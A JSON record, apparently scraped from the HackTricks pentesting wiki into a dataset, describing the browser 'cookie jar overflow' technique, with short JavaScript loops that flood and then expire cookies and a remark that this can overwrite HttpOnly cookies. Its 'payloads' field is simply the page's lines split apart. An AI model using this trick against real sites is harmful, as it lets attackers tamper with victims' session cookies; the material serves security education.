{
  "id": "pentesting_web_7c98f3d784a1",
  "category": "pentesting-web",
  "title": "cookie jar overflow",
  "description": "# Cookie Jar Overflow\n\n{{#include ../../banners/hacktricks-training.md}}\n\nThe browsers have a **limit on the number of cookies** that they can store for a page. Then, if for some reason you need to **make a cookie disappear**, you can **overflow the cookie jar** as the oldest ones will be deleted before:\n\n```javascript\n// Set many cookies\nfor (let i = 0; i < 700; i++) {\n  document.cookie = `cookie${i}=${i}; Secure`\n}\n\n// Remove all cookies\nfor (let i = 0; i < 700; i++) {\n  document.cookie = `coo",
  "payloads": [
    "# Cookie Jar Overflow",
    "{{#include ../../banners/hacktricks-training.md}}",
    "The browsers have a **limit on the number of cookies** that they can store for a page. Then, if for some reason you need to **make a cookie disappear**, you can **overflow the cookie jar** as the oldest ones will be deleted before:",
    "```javascript",
    "// Set many cookies",
    "for (let i = 0; i < 700; i++) {",
    "document.cookie = `cookie${i}=${i}; Secure`",
    "// Remove all cookies",
    "for (let i = 0; i < 700; i++) {",
    "document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`",
    "Notice, that third party cookies pointing to a different domain won't be overwritten.",
    "> [!CAUTION]",
    "> This attack can also be used to **overwrite HttpOnly cookies as you can delete it and then reset it with the value you want**.",
    "> Check this in [**this post with a lab**](https://www.sjoerdlangkemper.nl/2020/05/27/overwriting-httponly-cookies-from-javascript-using-cookie-jar-overflow/).",
    "{{#include ../../banners/hacktricks-training.md}}"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/pentesting-web/hacking-with-cookies/cookie-jar-overflow.md"
  ]
}